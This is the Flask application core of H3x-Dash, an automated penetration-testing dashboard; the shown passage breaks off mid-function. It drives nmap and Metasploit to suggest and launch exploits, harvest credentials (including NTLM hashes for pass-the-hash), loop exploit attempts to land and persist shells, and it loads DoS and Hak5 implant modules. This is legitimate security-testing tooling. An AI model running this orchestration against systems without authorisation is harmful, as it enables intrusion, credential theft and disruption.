#!/usr/bin/env python3
"""
H3x-Dash — Automated Penetration Framework
Flask application core: routes, SSE streaming, API endpoints.
"""

import json
import queue
import re
import threading
import uuid
from datetime import datetime, timezone
from flask import (Flask, render_template, request, jsonify, Response,
                   stream_with_context, send_file, redirect)
from pathlib import Path

from config import H3xConfig
from modules.nmap_engine import (
    NmapEngine, PORT_PROFILES, PORT_PROFILE_DESC, SCAN_MODES,
    TIMING_DESC, SCRIPT_PROFILES, SCRIPT_DESC,
)
from modules.enum_engine import EnumEngine, TOOL_LABELS
from modules import enum_engine as enum_engine_mod      # for plugin registration
from modules.msf_scanner import MsfScanner
from modules.preflight import PreflightChecker, validate_target
from modules.msf_daemon import (
    start_background as msf_daemon_start,
    stop_msfrpcd    as msf_daemon_stop,
    get_status      as msf_daemon_status,
)
from modules.msf_engine import MsfEngine
from modules.cve_chain import CveChain
from modules.loot import LootManager
from modules import plugin_system
from modules.credentials import CredentialStore, creds_from_finding
from modules import mitre_mapping
from modules.cve_intel import CveIntel
from modules.ops_log import ops_log
from modules.implant_engine import (
    ImplantRegistry, WirelessController, PcapRegistry, validate_connect,
    list_payloads, PRODUCTS as IMPLANT_PRODUCTS, PORTAL_TEMPLATES,
)
from modules.payload_sources import PayloadSourceManager

# ── App init ──────────────────────────────────────────────────────────────────

app = Flask(__name__)
app.secret_key = H3xConfig.SECRET_KEY
H3xConfig.init_dirs()

# ── Fresh-start purge ─────────────────────────────────────────────────────────
# --fresh      : clear previous-run artifacts (scans/, logs/, reports/, and the
#                stale validation verdicts) + reset msfrpcd sessions on connect.
# --fresh-all  : also wipe captured creds + the CVE-intel cache.
# Runs BEFORE the engines instantiate so they come up empty (no stale state
# bleeding into the new session).
import sys as _sys
_FRESH      = ('--fresh' in _sys.argv) or ('--clean' in _sys.argv) or ('--fresh-all' in _sys.argv)
_FRESH_ALL  = '--fresh-all' in _sys.argv
if _FRESH:
    from modules import housekeeping as _hk
    _purge = _hk.purge_from_config(H3xConfig,
                                   include_creds=_FRESH_ALL,
                                   include_intel=_FRESH_ALL)
    print(_hk.format_summary(_purge))
    H3xConfig.init_dirs()   # recreate any dirs whose contents we cleared

# ── Plugin discovery — runs BEFORE EnumEngine is instantiated so dispatch ─────
# tables are extended before any enum sweep can dispatch.
plugin_system.load_plugins()
_PLUGIN_COUNT = plugin_system.register_with_enum_engine(enum_engine_mod)
print(f"  [plugins] {_PLUGIN_COUNT} loaded, "
      f"{len(plugin_system.load_errors())} error(s)")

# ── Global engine instances ───────────────────────────────────────────────────

scan_engine  = NmapEngine()
enum_engine  = EnumEngine()
msf_engine   = MsfEngine()
cve_chain    = CveChain()
loot_manager = LootManager()
cred_store   = CredentialStore(H3xConfig.LOOT_DIR / 'credentials.json')
cve_intel    = CveIntel(H3xConfig.LOOT_DIR / 'cve_intel.json')

# Hak5 / Spectrum — physical implant registry + WiFi Pineapple controller.
# Seeds one instance per product on first run so the inventory tree starts
# populated; the operator renames / extends from there.
implant_registry = ImplantRegistry(H3xConfig.LOOT_DIR / 'implants.json')
_seeded = implant_registry.seed_defaults()
if _seeded:
    print(f"  [hak5] seeded {_seeded} payload-class device instances")
wireless_ctl = WirelessController(implant_registry)
pcap_registry = PcapRegistry(H3xConfig.LOOT_DIR / 'pcap_registry.json')

# Vetted GitHub payload sources — pulls payloads from an allowlist of official
# Hak5/O.MG repos and merges them into the Payload library. Cached payloads are
# registered with implant_engine on construction (no network needed at boot).
payload_sources = PayloadSourceManager(H3xConfig.LOOT_DIR / 'payload_sources.json')

from modules.msf_validator import MsfValidator
msf_validator = MsfValidator(msf_engine, H3xConfig.LOOT_DIR)

# ── Disruption Engine (DoS) ────────────────────────────────────────────────────
from modules.dos_engine import DoSEngine
dos_engine = DoSEngine()

from modules.scanner_runner import ScannerRunner, is_scanner_module
scanner_runner = ScannerRunner(msf_engine)


# ── Template context — runs on every render_template ──────────────────────────
# Single source of truth for variables the base layout needs. Without this,
# every route had to remember to pass msf_conn=... and any that forgot showed
# OFFLINE in the sidebar badge regardless of actual MSF state. The context
# processor is also where to add anything else the base template depends on.
@app.context_processor
def _inject_global_context():
    # msf_conn is cached state (is_connected just reads a flag) so it's safe to
    # call on every render. We deliberately do NOT call list_sessions() here:
    # it's a live RPC to msfrpcd, and putting it in the context processor would
    # make EVERY page render hit msfrpcd — hanging page loads if the daemon is
    # slow. The live session count is handled by the /api/msf/status JS poll.
    return {
        'msf_conn':    msf_engine.is_connected(),
        'app_version': H3xConfig.VERSION,
    }

# ── Credential auto-capture from enum findings ────────────────────────────────
# Hook into the EnumEngine's per-finding emission. The finding closure inside
# _enumerate_host calls this for every finding it dispatches; we extract any
# credential indicators and persist them.
def _capture_creds_from_finding(finding: dict) -> None:
    """Side-effect: pull creds out of a finding dict, store them, tag finding."""
    try:
        extracted = creds_from_finding(finding)
    except Exception as exc:
        print(f"  [cred-capture] extract {finding.get('tool', '?')}: {exc}")
        return
    captured = []
    # Per-cred guard: one malformed cred (e.g. an unknown type) must not drop the
    # sibling creds from the same finding.
    for c in extracted:
        try:
            captured.append(cred_store.add(c))
        except Exception as exc:
            print(f"  [cred-capture] add {finding.get('tool', '?')} "
                  f"({c.get('type', '?')}): {exc}")
    if captured:
        finding.setdefault('cred_ids', []).extend(captured)

# Attach to enum_engine so its finding closure can find it
enum_engine.on_finding_hook = _capture_creds_from_finding

msf_scanner = MsfScanner()
msf_scanner.start()   # builds CVE index from local FS in background

# ── Pre-flight check on startup ───────────────────────────────────────────────
_preflight_results: dict = {}
def _run_preflight():
    global _preflight_results
    checker = PreflightChecker()
    _preflight_results = checker.summary()
    fails = _preflight_results['fail']
    warns = _preflight_results['warn']
    print(f'[H3x-Dash] Pre-flight: {_preflight_results["pass"]} pass, '
          f'{warns} warn, {fails} fail')
    for c in _preflight_results['checks']:
        icon = {'pass':'  ✓','warn':'  ⚠','fail':'  ✗'}.get(c['status'],'  ?')
        print(f'{icon} {c["name"]}: {c["message"]}')

import threading as _t
_t.Thread(target=_run_preflight, daemon=True, name='h3x-preflight').start()

# ── msfrpcd auto-start ────────────────────────────────────────────────────────
# Launches msfrpcd in a background thread if it isn't already running.
# Pass --no-msf on the command line to skip (useful when managing msfrpcd
# externally or running under a supervisor process).
#
#   sudo python3 h3x-dash.py          # auto-start msfrpcd
#   sudo python3 h3x-dash.py --no-msf # skip — start msfrpcd manually

_SKIP_MSF_DAEMON = '--no-msf' in _sys.argv

if not _SKIP_MSF_DAEMON:
    # --fresh: stop any msfrpcd we previously started so the next start is a
    # brand-new daemon with zero sessions/jobs. (External msfrpcd is handled by
    # the post-connect session kill below.)
    if _FRESH:
        print('[H3x-Dash] --fresh: restarting msfrpcd for a clean session table')
        msf_daemon_stop()
        import time as _t, socket as _sock
        def _port_live():
            try:
                with _sock.create_connection(
                        (H3xConfig.MSF_HOST, H3xConfig.MSF_PORT), timeout=1):
                    return True
            except OSError:
                return False
        for _ in range(10):                       # wait up to ~5s for port close
            if not _port_live():
                break
            _t.sleep(0.5)
    msf_daemon_start(
        host     = H3xConfig.MSF_HOST,
        port     = H3xConfig.MSF_PORT,
        password = H3xConfig.MSF_PASS,
        ssl      = H3xConfig.MSF_SSL,
    )
else:
    print('[H3x-Dash] --no-msf flag set — skipping msfrpcd auto-start')

# --fresh belt-and-suspenders: once connected (fresh OR external msfrpcd), kill
# any lingering sessions exactly once so the Shell panel starts empty.
if _FRESH:
    def _fresh_session_purge():
        import time as _t
        for _ in range(120):                      # wait up to ~60s for connect
            if msf_engine.is_connected():
                try:
                    res = msf_engine.kill_all_sessions()
                    n = res.get('count', 0)
                    if n:
                        print(f'[H3x-Dash] --fresh: cleared {n} lingering MSF session(s)')
                except Exception as exc:
                    print(f'[H3x-Dash] --fresh: session purge skipped ({exc})')
                return
            _t.sleep(0.5)
    threading.Thread(target=_fresh_session_purge, daemon=True,
                     name='h3x-fresh-purge').start()

# ── MSF auto-connect on startup ───────────────────────────────────────────────
# Spawns a background thread that retries every 10s until msfrpcd answers.
# Override host/port/pass via environment variables (see config.py).

msf_engine.start_auto_connect(
    host     = H3xConfig.MSF_HOST,
    port     = H3xConfig.MSF_PORT,
    password = H3xConfig.MSF_PASS,
    ssl      = H3xConfig.MSF_SSL,
)

# ── SSE queue registry ────────────────────────────────────────────────────────

_sse_queues: dict[str, queue.Queue] = {}
_sse_lock = threading.Lock()

def _get_queue(client_id: str) -> queue.Queue:
    with _sse_lock:
        if client_id not in _sse_queues:
            _sse_queues[client_id] = queue.Queue(maxsize=500)
        return _sse_queues[client_id]

def _drop_queue(client_id: str):
    with _sse_lock:
        _sse_queues.pop(client_id, None)


# ─────────────────────────────────────────────────────────────────────────────
#  PAGE ROUTES
# ─────────────────────────────────────────────────────────────────────────────

@app.route('/')
def dashboard():
    stats = {
        'hosts':    scan_engine.get_host_count(),
        'vulns':    scan_engine.get_vuln_count(),
        'sessions': msf_engine.get_session_count(),
        'scans':    scan_engine.get_scan_count(),
    }
    recent   = scan_engine.get_recent_activity()
    msf_conn = msf_engine.is_connected()
    return render_template('dashboard.html', stats=stats, recent=recent, msf_conn=msf_conn)


@app.route('/scan')
def scan():
    return render_template('scan.html',
        port_profiles=PORT_PROFILES,
        port_profile_desc=PORT_PROFILE_DESC,
        scan_modes=SCAN_MODES,
        timing_desc=TIMING_DESC,
        script_profiles=SCRIPT_PROFILES,
        script_desc=SCRIPT_DESC,
    )


@app.route('/exploit')
def exploit():
    hosts = scan_engine.get_hosts_with_ports()
    msf_conn = msf_engine.is_connected()
    return render_template('exploit.html', hosts=hosts, msf_conn=msf_conn)


@app.route('/validate')
def validate_page():
    hosts = scan_engine.get_hosts_with_ports()
    return render_template('validate.html', hosts=hosts)


@app.route('/enumerate')
def enumerate_page():
    hosts    = scan_engine.get_hosts_with_ports()
    tools           = EnumEngine.available_tools()
    tool_categories = EnumEngine.tool_availability_layout()
    status          = enum_engine.get_status()
    findings        = enum_engine.get_findings_flat()
    return render_template('enumerate.html',
        hosts=hosts, tools=tools, tool_categories=tool_categories,
        status=status, findings=findings, tool_labels=TOOL_LABELS)


@app.route('/modules')
def modules_page():
    return render_template('modules.html', stats=msf_scanner.stats())


@app.route('/loot')
def loot():
    reports  = loot_manager.list_reports()
    sessions = msf_engine.list_sessions()
    return render_template('loot.html', reports=reports, sessions=sessions)


# ─────────────────────────────────────────────────────────────────────────────
#  SCAN API
# ─────────────────────────────────────────────────────────────────────────────

@app.route('/api/scan/start', methods=['POST'])
def api_scan_start():
    data      = request.get_json(silent=True) or {}
    client_id = data.get('client_id') or str(uuid.uuid4())
    q         = _get_queue(client_id)

    def on_output(line: str):
        ops_log.append_scan_line(client_id, line)
        try:
            q.put_nowait({'type': 'output', 'data': line})
        except queue.Full:
            pass

    def on_complete(hosts, meta):
        ops_log.finish_scan_job(client_id, host_count=len(hosts),
                                status='complete')
        try:
            q.put_nowait({'type': 'complete', 'host_count': len(hosts), 'meta': meta})
        except queue.Full:
            pass

    # Validate target before any subprocess runs
    target = data.get('target', '').strip()
    ok, msg = validate_target(target)
    if not ok:
        return jsonify({'status': 'error', 'message': f'Invalid target: {msg}'}), 400

    ops_log.begin_scan_job(client_id, target, data)
    started = scan_engine.start_scan(data, on_output=on_output, on_complete=on_complete)
    if not started:
        return jsonify({'status': 'error', 'message': 'Scan already running'}), 409

    return jsonify({'status': 'started', 'client_id': client_id})


@app.route('/api/scan/stop', methods=['POST'])
def api_scan_stop():
    scan_engine.stop_scan()
    return jsonify({'status': 'stopped'})


@app.route('/api/scan/status')
def api_scan_status():
    return jsonify(scan_engine.get_status())


@app.route('/api/scan/results')
def api_scan_results():
    return jsonify(scan_engine.get_results())


@app.route('/api/scan/history')
def api_scan_history():
    return jsonify({
        'history': scan_engine.get_recent_activity(),
        'stats': {
            'hosts':    scan_engine.get_host_count(),
            'vulns':    scan_engine.get_vuln_count(),
            'sessions': msf_engine.get_session_count(),
            'scans':    scan_engine.get_scan_count(),
        }
    })


@app.route('/api/scan/stream')
def api_scan_stream():
    client_id = request.args.get('client_id', 'default')
    q         = _get_queue(client_id)

    def generate():
        try:
            while True:
                try:
                    event = q.get(timeout=25)
                    yield f"data: {json.dumps(event)}\n\n"
                    if event.get('type') in ('complete', 'error'):
                        break
                except queue.Empty:
                    yield f"data: {json.dumps({'type': 'heartbeat'})}\n\n"
        finally:
            _drop_queue(client_id)

    return Response(
        stream_with_context(generate()),
        mimetype='text/event-stream',
        headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'},
    )


# ─────────────────────────────────────────────────────────────────────────────
#  CVE CHAIN API
# ─────────────────────────────────────────────────────────────────────────────

@app.route('/api/cve/suggest', methods=['POST'])
def api_cve_suggest():
    data  = request.get_json(silent=True) or {}
    ip    = data.get('ip')
    # Optional: if True, filter suggestions to only modules applicable to the
    # detected host class. If False (default), return everything as before.
    apply_class_filter = bool(data.get('class_filter', False))

    hosts = scan_engine.get_hosts_with_ports()
    host  = next((h for h in hosts if h.get('ip') == ip), None)
    if not host:
        return jsonify({'suggestions': []})

    enum_findings = enum_engine.get_findings_for_host(ip)

    # Classify the host. The result is returned to the UI either way so the
    # operator can see what we think this target is, even when not filtering.
    from modules import host_classifier as _hc
    classification = _hc.classify(host)
    # Only filter by classes with reasonable confidence
    confident_classes = [c['class_id'] for c in classification
                         if c['confidence'] >= 30]

    suggestions = cve_chain.suggest(
        host, host.get('ports', []),
        enum_findings=enum_findings,
        host_classes=confident_classes if apply_class_filter else None,
    )

    # ── CVE intel annotation ──────────────────────────────────────────────
    # Stamp each suggestion with KEV status (actively exploited?) and any
    # cached NVD CVSS. Operators see at a glance which suggestions match
    # vulns currently being used in the wild — far stronger prioritization
    # signal than CVSS alone.
    for s in suggestions:
        cve = s.get('cve')
        if not cve:
            continue
        intel = cve_intel.annotate_cve(cve)
        s['kev_listed'] = bool(intel.get('kev_listed'))
        if intel.get('kev_data'):
            s['kev_data'] = {
                'vendor':         intel['kev_data'].get('vendor', ''),
                'date_added':     intel['kev_data'].get('date_added', ''),
                'ransomware_use': intel['kev_data'].get('ransomware_use', ''),
            }
        if intel.get('nvd_data') and intel['nvd_data'].get('cvss_v31') is not None:
            s['cvss_v31']    = intel['nvd_data'].get('cvss_v31')
            s['cvss_vector'] = intel['nvd_data'].get('cvss_vector', '')

    # ── MSF validation carry-forward ──────────────────────────────────────────
    # If the operator ran the Validate stage for this host, stamp each suggestion
    # with the MSF feasibility verdict so the Exploit tab shows VULNERABLE /
    # NOT VULN / UNKNOWN right next to the module they're about to fire.
    verdicts = msf_validator.get_verdicts_for_host(ip)
    for s in suggestions:
        v = verdicts.get(s.get('msf_module'))
        if v:
            s['msf_verdict']        = v.get('verdict')
            s['msf_verdict_detail'] = v.get('detail', '')

    # Always also report unfiltered count so UI can show "5 of 17 applicable"
    total_unfiltered = (
        suggestions if not apply_class_filter
        else cve_chain.suggest(host, host.get('ports', []),
                                enum_findings=enum_findings)
    )

    return jsonify({
        'suggestions':         suggestions,
        'total_unfiltered':    len(total_unfiltered),
        'classification':      classification,
        'class_filter':        apply_class_filter,
        'enum_finding_count':  len(enum_findings),
    })


@app.route('/api/classify/<ip>')
def api_classify(ip):
    """Return host classification with no chain lookup — UI badge / preview."""
    from modules import host_classifier as _hc
    hosts = scan_engine.get_hosts_with_ports()
    host  = next((h for h in hosts if h.get('ip') == ip), None)
    if not host:
        return jsonify({'error': 'host not found in scan results'}), 404
    return jsonify({
        'ip':              ip,
        'classification':  _hc.classify(host),
        'best_class':      _hc.best_class(host),
        'available':       _hc.all_classes(),
    })


@app.route('/api/network/lhost')
def api_network_lhost():
    """
    Return the local IP address to use as LHOST when reaching rhost.
    Uses 'ip route get <rhost>' to find the kernel-selected source address.
    """
    import re as _re
    rhost = request.args.get('rhost', '').strip()
    if not rhost:
        return jsonify({'lhost': '', 'error': 'rhost required'})
    # Validate: must look like an IPv4 address before passing to subprocess
    if not _re.match(r'^(\d{1,3}\.){3}\d{1,3}$', rhost):
        return jsonify({'lhost': '', 'error': f'Invalid IP address: {rhost!r}'})
    try:
        import subprocess as _sp
        out = _sp.check_output(
            ['ip', 'route', 'get', rhost],
            stderr=_sp.DEVNULL, text=True, timeout=5
        )
        m = _re.search(r'\bsrc\s+([\d.a-fA-F:]+)', out)
        if m:
            return jsonify({'lhost': m.group(1)})
    except Exception as exc:
        return jsonify({'lhost': '', 'error': str(exc)})
    return jsonify({'lhost': '', 'error': 'Could not determine source address'})


@app.route('/api/network/callback-verify', methods=['POST'])
def api_network_callback_verify():
    """Pre-flight reverse/bind callback path checks before exploit launch."""
    from modules.callback_verify import verify_callback

    data = request.get_json(silent=True) or {}
    rhost = (data.get('rhost') or '').strip()
    lhost = (data.get('lhost') or '').strip()
    payload = data.get('payload') or None
    if payload is not None:
        payload = str(payload).strip() or None

    rport = data.get('rport')
    if rport not in (None, ''):
        try:
            rport = int(rport)
        except (TypeError, ValueError):
            return jsonify({'error': f'Invalid rport: {rport!r}'}), 400
    else:
        rport = None

    lport = data.get('lport', 4444)
    try:
        lport = int(lport)
    except (TypeError, ValueError):
        lport = 4444

    return jsonify(verify_callback(
        rhost=rhost, rport=rport, lhost=lhost, lport=lport, payload=payload,
    ))


@app.route('/api/ops/logs/exploit')
def api_ops_logs_exploit():
    """Recent exploit run logs (newest first), optional RHOST filter."""
    rhost = request.args.get('rhost', '').strip() or None
    try:
        limit = int(request.args.get('limit', 10))
    except (TypeError, ValueError):
        limit = 10
    return jsonify({'logs': ops_log.list_exploit_logs(rhost=rhost, limit=limit)})


@app.route('/api/ops/logs/exploit/<path:filename>')
def api_ops_log_exploit_detail(filename):
    """Load one exploit log artifact (.json metadata or .txt transcript)."""
    data = ops_log.read_exploit_artifact(filename)
    if not data:
        return jsonify({'error': 'not found'}), 404
    return jsonify(data)


@app.route('/api/cve/all')
def api_cve_all():
    hosts = scan_engine.get_hosts_with_ports()
    results = {}
    for host in hosts:
        ip            = host.get('ip')
        enum_findings = enum_engine.get_findings_for_host(ip)
        results[ip]   = cve_chain.suggest(host, host.get('ports', []),
                                           enum_findings=enum_findings)
    return jsonify(results)


# ─────────────────────────────────────────────────────────────────────────────
#  METASPLOIT API
# ─────────────────────────────────────────────────────────────────────────────

@app.route('/api/msf/connect', methods=['POST'])
def api_msf_connect():
    data   = request.get_json(silent=True) or {}
    result = msf_engine.connect(
        host     = data.get('host',     H3xConfig.MSF_HOST),
        port     = int(data.get('port', H3xConfig.MSF_PORT)),
        password = data.get('password', H3xConfig.MSF_PASS),
        ssl      = data.get('ssl',      H3xConfig.MSF_SSL),
    )
    return jsonify(result)


@app.route('/api/msf/disconnect', methods=['POST'])
def api_msf_disconnect():
    msf_engine.disconnect()
    return jsonify({'status': 'disconnected'})


@app.route('/api/msf/status')
def api_msf_status():
    return jsonify({
        'connected':  msf_engine.is_connected(),
        'version':    msf_engine.get_version(),
        'sessions':   msf_engine.get_session_count(),
        'last_error': msf_engine.get_last_error(),
    })


@app.route('/api/msf/search', methods=['POST'])
def api_msf_search():
    data    = request.get_json(silent=True) or {}
    modules = msf_engine.search(data.get('query', ''))
    return jsonify({'modules': modules})


@app.route('/api/msf/run', methods=['POST'])
def api_msf_run():
    data = request.get_json(silent=True) or {}
    # New optional params: target (int index), action ('run'|'check'),
    # poll_timeout (seconds). All have safe defaults — existing callers
    # that don't send them get the legacy 'run' behaviour.
    target = data.get('target')
    if target is not None:
        try:
            target = int(target)
        except (TypeError, ValueError):
            target = None
    action = data.get('action', 'run')
    if action not in ('run', 'check', 'exploit'):
        action = 'run'
    poll_timeout = data.get('poll_timeout', 60)
    try:
        poll_timeout = max(10, min(300, int(poll_timeout)))
    except (TypeError, ValueError):
        poll_timeout = 60

    # auto_migrate: None = auto (on for fragile kernel exploits), or explicit
    # bool from the UI toggle. Anything that isn't a real bool → None (auto).
    auto_migrate = data.get('auto_migrate')
    if not isinstance(auto_migrate, bool):
        auto_migrate = None

    result = msf_engine.run_exploit(
        module       = data.get('module'),
        options      = data.get('options', {}),
        payload      = data.get('payload'),
        target       = target,
        action       = action,
        poll_timeout = poll_timeout,
        auto_migrate = auto_migrate,
    )
    return jsonify(result)


@app.route('/api/msf/check', methods=['POST'])
def api_msf_check():
    """
    Run a module in CHECK mode — tests target vulnerability without
    delivering the payload. Returns the same shape as /api/msf/run with
    check_vulnerable / check_safe flags set based on console output.
    Useful for "is this exploit even applicable" pre-flight.
    """
    data = request.get_json(silent=True) or {}
    result = msf_engine.run_exploit(
        module  = data.get('module'),
        options = data.get('options', {}),
        payload = None,           # check mode never delivers payload
        target  = data.get('target') if data.get('target') is not None else None,
        action  = 'check',
        poll_timeout = 30,
    )
    return jsonify(result)


@app.route('/api/msf/inspect', methods=['POST'])
def api_msf_inspect():
    """
    Load a module via msfrpcd and return its metadata WITHOUT executing:
      - required options + descriptions
      - targets list with indices
      - rank, platform, references
      - compatible payloads (truncated)
    Used by the exploit UI to show the operator what's expected before
    they click LAUNCH — eliminates "exploit fired but missing required
    option" surprises.
    """
    data    = request.get_json(silent=True) or {}
    module  = (data.get('module') or '').strip()
    if not module:
        return jsonify({'error': 'module required'}), 400

    client = msf_engine._client_ref()
    if client is None:
        return jsonify({'error': 'Not connected to MSF RPC'}), 503

    valid_types = ('exploit', 'auxiliary', 'post', 'payload', 'evasion')
    parts = module.split('/')
    mtype = parts[0] if parts and parts[0] in valid_types else 'exploit'
    mname = '/'.join(parts[1:]) if len(parts) > 1 else module

    try:
        m = client.modules.use(mtype, mname)
    except Exception as exc:
        return jsonify({'error': f'load failed: {exc}', 'module': module}), 500
    if not m or not hasattr(m, 'options'):
        return jsonify({'error': f'Module not found: {module}',
                        'hint':  'Run: msfconsole -q -x "use ' + module + '; exit"'}), 404

    # Extract metadata defensively — pymetasploit3 attribute presence varies
    info = {'module': module, 'type': mtype}
    for attr in ('rank', 'description', 'name', 'references', 'platform'):
        try:
            info[attr] = getattr(m, attr, None)
        except Exception:
            info[attr] = None
    try:
        info['required'] = list(getattr(m, 'required', []) or [])
    except Exception:
        info['required'] = []
    try:
        opt_map  = m.options if isinstance(m.options, dict) else {}
        info['options'] = {
            k: {'desc': v.get('desc', '') if isinstance(v, dict) else '',
                'required': v.get('required', False) if isinstance(v, dict) else False,
                'default':  v.get('default') if isinstance(v, dict) else None,
                'type':     v.get('type') if isinstance(v, dict) else None}
            for k, v in opt_map.items()
        }
    except Exception:
        info['options'] = {}
    try:
        tgts = list(getattr(m, 'targets', []) or [])
        info['targets'] = [{'index': i, 'name': str(t)}
                           for i, t in enumerate(tgts)]
    except Exception:
        info['targets'] = []
    try:
        pls = list(getattr(m, 'payloads', []) or [])
        info['payloads'] = pls[:30]
        info['payloads_total'] = len(pls)
    except Exception:
        info['payloads'] = []
        info['payloads_total'] = 0

    return jsonify(info)


@app.route('/api/msf/sessions')
def api_msf_sessions():
    return jsonify({'sessions': msf_engine.list_sessions()})


@app.route('/api/msf/sessions/kill-all', methods=['POST'])
def api_msf_sessions_kill_all():
    """Stop every MSF session — clears stale Shell tab entries."""
    return jsonify(msf_engine.kill_all_sessions())


@app.route('/api/msf/session/<sid>/kill', methods=['POST'])
def api_msf_session_kill(sid):
    """Stop a single MSF session — the per-tab close button on the Shell page."""
    return jsonify(msf_engine.kill_session(sid))


@app.route('/api/msf/session/cmd', methods=['POST'])
def api_msf_session_cmd():
    data   = request.get_json(silent=True) or {}
    result = msf_engine.session_command(
        session_id = str(data.get('session_id')),
        command    = data.get('command', ''),
    )
    return jsonify(result)


# ── New Shell-page endpoints ─────────────────────────────────────────────────
# session_command above stays for back-compat with the Loot modal. These four
# routes power the dedicated Shell tab.

@app.route('/api/msf/session/<sid>/read')
def api_msf_session_read(sid):
    """Non-blocking buffer read. Polled by Shell tab for streaming output."""
    return jsonify(msf_engine.session_read(sid))


@app.route('/api/msf/session/<sid>/write', methods=['POST'])
def api_msf_session_write(sid):
    """Raw write (mostly for shells where command framing matters)."""
    data = request.get_json(silent=True) or {}
    return jsonify(msf_engine.session_write(sid, data.get('data', '')))


@app.route('/api/msf/session/<sid>/run', methods=['POST'])
def api_msf_session_run(sid):
    """Type-dispatched command — picks the right MSF API per session type."""
    data    = request.get_json(silent=True) or {}
    command = data.get('command', '')
    timeout = int(data.get('timeout', 15))
    return jsonify(msf_engine.session_run(sid, command, timeout=timeout))


@app.route('/api/msf/launch-profile')
def api_msf_launch_profile():
    """Module-aware launch config (RPORT, payload mode, callback need, etc.)."""
    from modules.launch_profiles import resolve_launch_profile
    module = request.args.get('module', '').strip()
    return jsonify(resolve_launch_profile(module))


@app.route('/api/msf/capabilities')
def api_msf_capabilities():
    """Phase 1 — MSF's own ground truth for a module (options/payloads/targets)."""
    module = request.args.get('module', '').strip()
    if not module:
        return jsonify({'error': 'module required'}), 400
    return jsonify(msf_engine.module_capabilities(module))


def _build_resolver_env(data: dict) -> dict:
    """Assemble the resolver environment model: request + host class + route.

    Shared by /resolve-plan and /auto-chain so both reason about the same
    OS/arch + reverse-callback feasibility for the lab.
    """
    rhost = (data.get('rhost') or '').strip()
    env = {
        'rhost':   rhost,
        'rport':   data.get('rport'),
        'lhost':   (data.get('lhost') or '').strip() or None,
        'lport':   data.get('lport') or None,
        'service': data.get('service') or '',
        'version': data.get('version') or '',
    }
    # OS/arch from the host classifier when we have scan data for this host.
    try:
        from modules import host_classifier as _hc
        host = next((h for h in scan_engine.get_hosts_with_ports()
                     if h.get('ip') == rhost), None)
        if host:
            best = _hc.best_class(host) or ''
            if 'windows' in best:
                env['os_family'] = 'windows'
            elif any(k in best for k in ('linux', 'unix', 'samba')):
                env['os_family'] = 'linux'
            # Classification confidence gates the OS-compatibility guard — only a
            # confident call may veto an OS-mismatched module.
            try:
                classes = _hc.classify(host) or []
                if classes:
                    env['os_confidence'] = classes[0].get('confidence', 0)
            except Exception:
                pass
    except Exception:
        pass
    # Route feasibility: does LHOST route to the target, is LPORT free?
    if rhost and env.get('lhost'):
        try:
            from modules.callback_verify import verify_callback
            cb = verify_callback(rhost=rhost, rport=env.get('rport'),
                                 lhost=env['lhost'], lport=int(env.get('lport') or 4444),
                                 payload=None)
            routes = [c for c in cb.get('checks', []) if c['id'] == 'route']
            free   = [c for c in cb.get('checks', []) if c['id'] == 'lport_free']
            if routes:
                env['lhost_routable'] = routes[0]['ok']
            if free:
                env['lport_free'] = free[0]['ok']
        except Exception:
            pass

    # ── Enrichment sources — derivable option values the resolver can silently
    # auto-fill (credentials, web base path, domain) keyed by option name. ──────
    if rhost:
        # Captured credentials for this host → USERNAME/PASSWORD/DOMAIN options.
        # The store keeps the secret in `value` (not `password`), so map it here.
        # Prefer a usable secret over a bare username: password > hash > anything.
        try:
            creds = cred_store.list(host_ip=rhost)
            _PRI = {'password': 3, 'ntlm_hash': 2, 'unix_hash': 1}
            best = None
            best_score = (-1, '')
            for c in creds:
                if not (c.get('username') or c.get('value')):
                    continue
                score = (_PRI.get(c.get('type'), 0), c.get('timestamp', ''))
                if score > best_score:
                    best, best_score = c, score
            if best:
                secret = best.get('value') if best.get('type') == 'password' else None
                env['creds'] = {
                    'username': best.get('username'),
                    'password': secret,
                    'domain':   best.get('domain'),
                    # Surface a captured NTLM hash for pass-the-hash modules.
                    'ntlm_hash': (best.get('value')
                                  if best.get('type') == 'ntlm_hash' else None),
                }
        except Exception:
            pass
        # Enum-discovered web base path + domain → TARGETURI / DOMAIN options.
        try:
            findings = enum_engine.get_findings_for_host(rhost) or []
            for f in findings:
                path = f.get('path') or f.get('uri') or f.get('targeturi')
                if path and not env.get('web_path'):
                    env['web_path'] = path
                dom = f.get('domain') or f.get('fqdn')
                if dom and not env.get('domain'):
                    env['domain'] = dom
        except Exception:
            pass
    return env


@app.route('/api/msf/resolve-plan', methods=['POST'])
def api_msf_resolve_plan():
    """
    Phase 2 — recommended launch plan derived from capabilities + environment,
    re-armed by information gained from prior attempts against this target.
    """
    data = request.get_json(silent=True) or {}
    module = (data.get('module') or '').strip()
    if not module:
        return jsonify({'error': 'module required'}), 400
    return jsonify(msf_engine.recommend_plan(module, _build_resolver_env(data)))


# ── Auto-chain: closed-loop "land a stable shell" orchestrator ────────────────
from modules.auto_chain import AutoChainRunner
auto_chain_runner = AutoChainRunner(msf_engine)


@app.route('/api/msf/auto-chain/start', methods=['POST'])
def api_msf_auto_chain_start():
    """Start the recommend→run→shell-check→persist/re-arm loop for a target."""
    data = request.get_json(silent=True) or {}
    module = (data.get('module') or '').strip()
    if not module:
        return jsonify({'error': 'module required'}), 400
    if not msf_engine.is_connected():
        return jsonify({'error': 'MSF RPC offline — connect first'}), 409
    try:
        max_attempts = int(data.get('max_attempts', 5))
    except (TypeError, ValueError):
        max_attempts = 5
    max_attempts = max(1, min(max_attempts, 10))
    started = auto_chain_runner.start(module, _build_resolver_env(data),
                                      max_attempts=max_attempts)
    if not started:
        return jsonify({'error': 'an auto-chain is already running'}), 409
    return jsonify({'status': 'started', 'module': module,
                    'max_attempts': max_attempts})


@app.route('/api/msf/auto-chain/status')
def api_msf_auto_chain_status():
    """Poll the streamed event log + final result of the running/last chain."""
    return jsonify(auto_chain_runner.snapshot())


@app.route('/api/msf/session/<sid>/handoff')
def api_msf_session_handoff(sid):
    """Resolve the handoff profile for a live session (steps + guidance)."""
    return jsonify(msf_engine.resolve_session_handoff(sid))


@app.route('/api/msf/session/<sid>/confirm', methods=['POST'])
def api_msf_session_confirm(sid):
    """Run confirmation probes — prove the session is alive before hardening."""
    data = request.get_json(silent=True) or {}
    try:
        timeout = int(data.get('timeout', 10))
    except (TypeError, ValueError):
        timeout = 10
    return jsonify(msf_engine.confirm_session(sid, timeout=timeout))


@app.route('/api/msf/session/<sid>/capture_creds', methods=['POST'])
def api_msf_session_capture_creds(sid):
    """
